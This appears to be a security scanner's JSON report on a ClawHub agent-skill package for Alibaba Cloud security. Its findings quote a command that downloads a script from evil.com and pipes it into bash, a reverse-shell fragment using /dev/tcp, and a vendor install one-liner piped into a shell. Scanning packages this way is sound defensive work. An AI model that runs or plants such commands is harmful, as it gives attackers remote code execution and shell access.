@@ -1,0 +1,49 @@
+{
+  "item": {
+    "source": "clawhub",
+    "ecosystem": "clawhub",
+    "name": "sdk-team/alibabacloud-sas-openclaw-security",
+    "version": "0.0.2",
+    "download": "https://clawhub.ai/api/v1/download?slug=alibabacloud-sas-openclaw-security&ownerHandle=sdk-team&version=0.0.2"
+  },
+  "archive_sha256": "92a7decbf4418da7ee902520cc8be8fe6c32504a76b0a2749cd6db280e828fe7",
+  "findings": [
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "scripts/run_cloud_assistant_command.py",
+      "line": 228,
+      "evidence": "curl http://evil.com/x.sh | bash",
+      "file_sha256": "ed9c718ddb602919b965a9ae33a7553538db7ddd82daf0fe0ed4b6bcc8290b97"
+    },
+    {
+      "severity": "critical",
+      "id": "AGT-R-0104",
+      "summary": "Reverse shell one-liner",
+      "path": "scripts/run_cloud_assistant_command.py",
+      "line": 219,
+      "evidence": "bash -i >& /dev/tcp/",
+      "file_sha256": "ed9c718ddb602919b965a9ae33a7553538db7ddd82daf0fe0ed4b6bcc8290b97"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "SKILL.md",
+      "line": 29,
+      "evidence": "curl -fsSL https://aliyuncli.alicdn.com/setup.sh | bash",
+      "file_sha256": "ac70756dded671ca03b6fef328a6db9e7ebff77dcfe856a6bcc4a15ec10f895b"
+    }
+  ],
+  "flags": [],
+  "domains": [
+    "aliyuncli.alicdn.com",
+    "clawhub.ai",
+    "evil.com",
+    "help.aliyun.com",
+    "www.aliyun.com"
+  ],
+  "install_script": false,
+  "score": "critical"
+}
